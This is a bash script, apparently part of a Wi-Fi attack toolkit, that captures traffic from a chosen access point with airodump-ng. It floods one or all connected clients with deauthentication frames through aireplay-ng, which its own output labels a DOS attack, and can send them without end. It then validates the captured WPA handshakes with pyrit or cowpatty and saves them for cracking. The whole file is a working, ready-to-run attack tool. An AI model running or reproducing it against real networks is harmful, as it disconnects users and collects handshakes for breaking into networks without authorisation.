#!/bin/bash
#
#

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0 && tput bold)
BLUE=$(tput setaf 6 && tput bold)

Details(){

DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd | sed -e 's/\/Applications//g')

AP_essid=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $1 }' | sed -e 's/+/ /g' -e 's/^/"/g' -e 's/$/"/g')
AP_bssid=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $2 }')
AP_channel=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $4 }' | sed 's/Channel-//g')
AP_Name=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $1 }')
monX=$(cat $DIR/TempFolder/MonitorModeInterface.txt | awk '{ print $1 }')

}

Airodump(){

AirodumpCheck=$(ps aux | grep xterm | grep HandshakeCheck)
if [[ ! $AirodumpCheck ]]; then

   rm $DIR/TempFolder/*.csv &> /dev/null
   rm $DIR/TempFolder/HandshakeCheck.txt &> /dev/null
   rm $DIR/TempFolder/*.cap &> /dev/null
   rm $DIR/TempFolder/*.netxml &> /dev/null

   unset SESSION_MANAGER

   xterm -geometry 100x20+650+0 -l -lf $DIR/TempFolder/HandshakeCheck.txt -e "airodump-ng -c $AP_channel -w $DIR/TempFolder/psk --bssid $AP_bssid --ignore-negative-one $monX" &

fi

}

MainMenu(){

Airodump

sleep 2

while true
do

cat $DIR/TempFolder/psk-01.csv | sed -n '/Station MAC/,$p' | sed -e '1d' -e '$d' | awk '{ print $1 }' | sed -e 's/,//g' | sed -e 's/^[ \t]*//;s/[ \t]*$//' > $DIR/TempFolder/ClientList.txt

Client_List=$(cat $DIR/TempFolder/ClientList.txt | nl -ba -w 1  -s ': ')
LineCount=$(echo "$Client_List" | wc -l)

clear
echo $RED"Connected Clients:"$STAND
echo ""
echo "$Client_List"
echo ""
echo $RED"["$GREEN"1"$RED"-"$GREEN"$LineCount"$RED"]"$GREEN" = Deauthenticate A Single Client"
echo $RED"["$GREEN"0"$RED"]"$GREEN" = Deauthenticate All Clients"
echo $RED"["$GREEN"v"$RED"]"$GREEN" = Validate Captured Handshake"
echo $RED"["$GREEN"s"$RED"]"$GREEN" = Save Capture File"
echo $RED"["$GREEN"d"$RED"]"$GREEN" = Delete Capture File"
echo $RED"["$GREEN"p"$RED"]"$GREEN" = Proceed To Attack The Next Target"
echo ""
echo $RED"NOTE: Press the Enter button to refresh the client list."$STAND
echo ""
read -p $GREEN"Choose an option$STAND: " MainMenuOptions

NumberCheck='^[1-9]|^[1-9][0-9]|^[1-9][0-9][0-9]+$'
if [[ $MainMenuOptions =~ $NumberCheck ]]; then

   if [[ "$MainMenuOptions" -le "$LineCount" ]]; then

      while true
      do

      clear
      read -p $GREEN"Input the amount of deauth requests to send:$STAND " DeauthAmount

      case $DeauthAmount in
      [0-9]|[1-9][0-9]|[1-9][0-9][0-9])
      break ;;
      *) echo "Input was incorrect." ;;
      esac
      done

      DeauthCheck=$(echo "$DeauthAmount" | sed -e '/^0/!d')
      if [[ $DeauthCheck ]]; then

         Client=$(cat $DIR/TempFolder/ClientList.txt | sed -n ""$MainMenuOptions"p" | rev | awk '{ print $1 }' | rev)

         echo ""
         echo $RED"Deauthenticating client$STAND $Client$RED."$STAND
         echo $RED"Sending an infinite amount of deauthentication requests..."$STAND

         xterm -geometry 100x20+650+0 -l -e "aireplay-ng -0 0 -a $AP_bssid -c $Client --ignore-negative-one $monX" &

      else

         Client=$(cat $DIR/TempFolder/ClientList.txt | sed -n ""$MainMenuOptions"p" | rev | awk '{ print $1 }' | rev)

         echo ""
         echo $RED"Deauthenticating client$STAND $Client$RED."$STAND
         echo $RED"Sending $DeauthAmount deauthentication requests..."$STAND

         aireplay-ng -0 $DeauthAmount -a $AP_bssid -c $Client --ignore-negative-one $monX

      fi

   fi

   DeauthMethodCheck1=$(echo "Client")

fi

if [[ $MainMenuOptions == "0" ]]; then

   while true
   do

   clear
   read -p $GREEN"Input the amount of deauth requests to send:$STAND " DeauthAmount

   case $DeauthAmount in
   [0-9]|[1-9][0-9]|[1-9][0-9][0-9])
   break ;;
   *) echo "Input was incorrect." ;;
   esac
   done

   DeauthCheck=$(echo "$DeauthAmount" | sed -e '/^0/!d')
   if [[ $DeauthCheck ]]; then

      echo $RED"Deauthenticating all connected clients$STAND (DOS Attack)$RED."$STAND
      echo $RED"Sending an infinite amount of deauthentication requests..."$STAND

      xterm -geometry 100x20+650+0 -l -e "aireplay-ng -0 0 -a $AP_bssid --ignore-negative-one $monX" &

   else

      echo $RED"Deauthenticating all connected clients."$STAND
      echo $RED"Sending $DeauthAmount deauthentication requests..."$STAND

      aireplay-ng -0 $DeauthAmount -a $AP_bssid --ignore-negative-one $monX

   fi

   DeauthMethodCheck1=$(echo "Station")

fi

if [[ $MainMenuOptions == "v" ]]; then

   HandshakeCheck=$(cat $DIR/TempFolder/HandshakeCheck.txt | grep -e "handshake")
   if [[ $HandshakeCheck ]]; then

      HandshakeValidation

   else

      MainMenu

   fi

fi

if [[ $MainMenuOptions == "s" ]]; then

   CaptureFileCheck=$(ls -l $DIR/TempFolder | sed '/psk-01.cap/!d')
   if [[ $CaptureFileCheck ]]; then

      LoopProcessID=$(ps aux | grep xterm | grep HandshakeCheck | awk '{ print $2 }' | awk '{ print $1 }')
      kill $LoopProcessID &> /dev/null

      Time=$(date | sed -e 's/ /-/g' -e 's/--/-/g')

      echo "Capture file "$AP_bssid"_"$Time".cap will be stored in the $DIR/Captures/$AP_Name folder."

      mkdir $DIR/TempFolder/$AP_Name
      mv $DIR/TempFolder/*.cap $DIR/TempFolder/$AP_Name/"$AP_bssid"_"$Time".cap
      cp -r $DIR/TempFolder/$AP_Name $DIR/Captures
      rm -r $DIR/TempFolder/$AP_Name &> /dev/null

      rm $DIR/TempFolder/*.csv &> /dev/null
      rm $DIR/TempFolder/HandshakeCheck.txt &> /dev/null
      rm $DIR/TempFolder/*.cap &> /dev/null
      rm $DIR/TempFolder/*.netxml &> /dev/null
      rm $DIR/TempFolder/ClientList.txt &> /dev/null

      sleep 3

   else

      echo $RED"A capture file wasn't detected, skipping file save and returning to the attack menu.."$STAND

      sleep 3

   fi

   MainMenu

fi

if [[ $MainMenuOptions == "d" ]]; then

   CaptureFileCheck=$(ls -l $DIR/TempFolder | sed '/psk-01.cap/!d')
   if [[ $CaptureFileCheck ]]; then

      LoopProcessID=$(ps aux | grep xterm | grep HandshakeCheck | awk '{ print $2 }' | awk '{ print $1 }')
      kill $LoopProcessID &> /dev/null

      rm $DIR/TempFolder/*.csv &> /dev/null
      rm $DIR/TempFolder/HandshakeCheck.txt &> /dev/null
      rm $DIR/TempFolder/*.cap &> /dev/null
      rm $DIR/TempFolder/*.netxml &> /dev/null
      rm $DIR/TempFolder/ClientList.txt &> /dev/null

   else

      echo "A handshake wasn't detected, skipping file deletion."

      sleep 3

   fi

   MainMenu

fi

if [[ $MainMenuOptions == "p" ]]; then

   LoopProcessID=$(ps aux | grep xterm | grep HandshakeCheck | awk '{ print $2 }' | awk '{ print $1 }')
   kill $LoopProcessID &> /dev/null

   CaptureFileCheck=$(ls -l $DIR/TempFolder | sed '/psk-01.cap/!d')
   if [[ $CaptureFileCheck ]]; then

      rm $DIR/TempFolder/*.csv &> /dev/null
      rm $DIR/TempFolder/HandshakeCheck.txt &> /dev/null
      rm $DIR/TempFolder/*.cap &> /dev/null
      rm $DIR/TempFolder/*.netxml &> /dev/null
      rm $DIR/TempFolder/ClientList.txt &> /dev/null

   fi

   exit

fi

done

}

HandshakeValidation(){

LoopProcessID=$(ps aux | grep xterm | grep HandshakeCheck | awk '{ print $2 }' | awk '{ print $1 }')
kill $LoopProcessID &> /dev/null

rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/HandshakeCheck.txt &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/ClientList.txt &> /dev/null

clear

while true
do

while true
do

echo ""
echo $RED"["$GREEN"1"$RED"]"$GREEN" = Pyrit Handshake Validation"
echo $RED"["$GREEN"2"$RED"]"$GREEN" = Cowpatty Handshake Validation"
echo $RED"["$GREEN"3"$RED"]"$GREEN" = Return To The Attack Options Menu."
echo ""
read -p $GREEN"Choose an option$STAND: " ValidationOption

case $ValidationOption in
1|2|3)
break ;;
*) echo "Input was incorrect." ;;
esac
done

if [[ $ValidationOption == "1" ]]; then

   echo ""
   pyrit -r $DIR/TempFolder/*.cap analyze
   echo ""

fi

if [[ $ValidationOption == "2" ]]; then

   echo ""
   cowpatty -r $DIR/TempFolder/*.cap -c
   echo ""

fi

if [[ $ValidationOption == "3" ]]; then

   while true
   do

   echo ""
   echo $RED"["$GREEN"s"$RED"]"$GREEN" = Save Handshake Capture File."
   echo $RED"["$GREEN"d"$RED"]"$GREEN" = Delete Handshake Capture File."
   echo ""
   read -p $GREEN"Choose an option$STAND: " SaveDeleteOption

   case $SaveDeleteOption in
   s|d)
   break ;;
   *) echo "Input was incorrect." ;;
   esac
   done

   if [[ $SaveDeleteOption == "s" ]]; then

      Time=$(date | sed -e 's/ /-/g' -e 's/--/-/g')

      echo "Capture file "$AP_bssid"_"$Time".cap will be stored in the $DIR/Captures/$AP_Name folder."

      mkdir $DIR/TempFolder/$AP_Name
      mv $DIR/TempFolder/*.cap $DIR/TempFolder/$AP_Name/"$AP_bssid"_"$Time".cap
      cp -r $DIR/TempFolder/$AP_Name $DIR/Captures
      rm -r $DIR/TempFolder/$AP_Name &> /dev/null

      sleep 3

   fi

   if [[ $SaveDeleteOption == "d" ]]; then

      LoopProcessID=$(ps aux | grep xterm | grep HandshakeCheck | awk '{ print $2 }' | awk '{ print $1 }')
      kill $LoopProcessID &> /dev/null

      rm $DIR/TempFolder/*.csv &> /dev/null
      rm $DIR/TempFolder/HandshakeCheck.txt &> /dev/null
      rm $DIR/TempFolder/*.cap &> /dev/null
      rm $DIR/TempFolder/*.netxml &> /dev/null
      rm $DIR/TempFolder/ClientList.txt &> /dev/null

      sleep 3

   fi

   MainMenu

fi

done

}

resize -s 29 78 &> /dev/null

clear
Details
MainMenu
